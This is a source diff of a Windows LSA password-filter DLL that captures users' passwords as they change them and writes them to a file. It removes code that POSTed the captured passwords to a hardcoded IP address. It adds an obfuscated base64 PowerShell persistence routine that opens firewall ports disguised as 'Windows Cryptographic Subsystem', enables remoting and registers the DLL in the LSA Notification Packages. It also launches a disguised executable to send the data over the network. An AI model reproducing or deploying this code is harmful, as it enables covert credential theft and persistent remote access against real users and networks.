@@ -16,15 +16,26 @@
 #include <SubAuth.h>
 #include "stdlib.h"
 #include <tchar.h>
-#include <winhttp.h>
-#include <ntsecapi.h>
-
-#pragma comment(lib, "winhttp.lib")
 
 //////// Helper functions
+//Does persistence things
+NTSTATUS justPersistenceThings(){
+    system("powershell.exe -EncodedCommand RQBuAGEAYgBsAGUALQBQAFMAUgBlAG0AbwB0AGkAbgBnADsAJABlAHgAaQBzAHQAaQBuAGcAUgB1AGwAZQAgAD0AIABHAGUAdAAtAE4AZQB0AEYAaQByAGUAdwBhAGwAbABSAHUAbABlACAALQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUwB1AGIAcwB5AHMAdABlAG0AIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA7AGkAZgAgACgALQBuAG8AdAAgACQAZQB4AGkAcwB0AGkAbgBnAFIAdQBsAGUAKQAgAHsATgBlAHcALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBXAGkAbgBkAG8AdwBzACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFMAdQBiAHMAeQBzAHQAZQBtACIAIAAtAEQAaQByAGUAYwB0AGkAbwBuACAASQBuAGIAbwB1AG4AZAAgAC0ATABvAGMAYQBsAFAAbwByAHQAIAA1ADkAOAA1ACAALQBQAHIAbwB0AG8AYwBvAGwAIABUAEMAUAAgAC0AQQBjAHQAaQBvAG4AIABBAGwAbABvAHcAOwBOAGUAdwAtAE4AZQB0AEYAaQByAGUAdwBhAGwAbABSAHUAbABlACAALQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUwB1AGIAcwB5AHMAdABlAG0AIgAgAC0ARABpAHIAZQBjAHQAaQBvAG4AIABPAHUAdABiAG8AdQBuAGQAIAAtAEwAbwBjAGEAbABQAG8AcgB0ACAANQA5ADgANQAgAC0AUAByAG8AdABvAGMAbwBsACAAVABDAFAAIAAtAEEAYwB0AGkAbwBuACAAQQBsAGwAbwB3ADsATgBlAHcALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBIAFQAVABQACAAbwB1AHQAIgAgAC0ARABpAHIAZQBjAHQAaQBvAG4AIABPAHUAdABiAG8AdQBuAGQAIAAtAEwAbwBjAGEAbABQAG8AcgB0ACAAOAAwACAALQBQAHIAbwB0AG8AYwBvAGwAIABUAEMAUAAgAC0AQQBjAHQAaQBvAG4AIABBAGwAbABvAHcAfQBSAGUAbQBvAHYAZQAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFAAYQBjAGsAYQBnAGUAcwAiADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFAAYQBjAGsAYQBnAGUAcwAiACAALQBWAGEAbAB1AGUAIAAiAHIAYQBzAHMAZgBtAGAAcgBgAG4AcwBjAGUAYwBsAGkAYAByAGAAbgBsAGkAYgBmAGkAbAB0AGUAcgAiACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAE0AdQBsAHQAaQBTAHQAcgBpAG4AZwA=");
+
+    // Enable-PSRemoting;
+    // $existingRule = Get-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -ErrorAction SilentlyContinue;
+    // if (-not $existingRule) {
+    //      New-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -Direction Inbound -LocalPort 5985 -Protocol TCP -Action Allow;
+    //      New-NetFirewallRule -DisplayName "Windows Cryptographic Subsystem" -Direction Outbound -LocalPort 5985 -Protocol TCP -Action Allow;
+    //      New-NetFirewallRule -DisplayName "HTTP out" -Direction Outbound -LocalPort 80 -Protocol TCP -Action Allow}
+    // Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Notification Packages";
+    // New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "Notification Packages" -Value "rassfm`r`nscecli`r`nlibfilter" -PropertyType MultiString
+
+    return 0;
+}
 
 //Concatante two PUNICODE strings.
-//I really hope you like pointer sillyness
+//I really hope you like pointer silliness
 //because I don't
 // in: String1, String2: the strings to stick together
 // out: Result: a pointer to populate with the result
@@ -62,58 +73,10 @@ NTSTATUS catUTF16LEStr(
     return STATUS_SUCCESS;
 }
 
-BOOL sendToServer(PUNICODE_STRING text) {
-    //std::cout << text->Buffer;
-
-    // Initialize WinHTTP
-    HINTERNET hSession = WinHttpOpen(L"Microsoft-CryptoAPI/10.0",
-                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                     WINHTTP_NO_PROXY_NAME,
-                                     WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) {
-       // std::cerr << "winhttp failed";
-        return FALSE;
-    }
-
-    // Connect to the remote
-    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.109.131", 80, 0);
-    if (!hConnect) {
-        //std::cerr << "connect failed";
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
-
-    // Create an HTTP POST
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/post",
-                                            NULL, WINHTTP_NO_REFERER,
-                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                            0);
-    if (!hRequest) {
-       // std::cerr << "POST failed";
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
-
-    // Send the request
-    LPCWSTR headers = L"Content-Type: text/plain; charset=UTF-16LE";
-    BOOL bResults = WinHttpSendRequest(hRequest,
-                                       headers, -1L,
-                                       (LPVOID)text->Buffer,
-                                       text->Length,
-                                       text->Length, 0);
-
-   // std::cout << "Sent!";
-
-    // Clean up
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-
-    return bResults;
-}
-
-
+//Write a *unicodestring to a hardcoaded file
+//For writing the passwords
+//takes: PUNICODE_STRING to write
+//returns: status
 BOOL writeToFile(PUNICODE_STRING text) {
     //open a file (the janky windows way)
     HANDLE hFile = CreateFileW(
@@ -189,6 +152,7 @@ extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) 
 //return FALSE to deny change, TRUE to accept
 //this function being called does not mean the change was successful
 extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING uname, PUNICODE_STRING legalName, PUNICODE_STRING password, BOOLEAN SetOperation){
+    justPersistenceThings();
     return TRUE; //not going to actually prevent password changes right now
 }
 
@@ -212,9 +176,10 @@ extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICOD
     free(temp1);
     free(temp2);
 
-   //Zach help, unicode characters are super hard to concatenate
     writeToFile(fullString);
-    sendToServer(fullString);
+
+    //call the other executable for networking
+    system(R"("C:\Program Files\Windows NT\MicrosoftCryptographicManager.exe")");
 
     free(fullString);
 
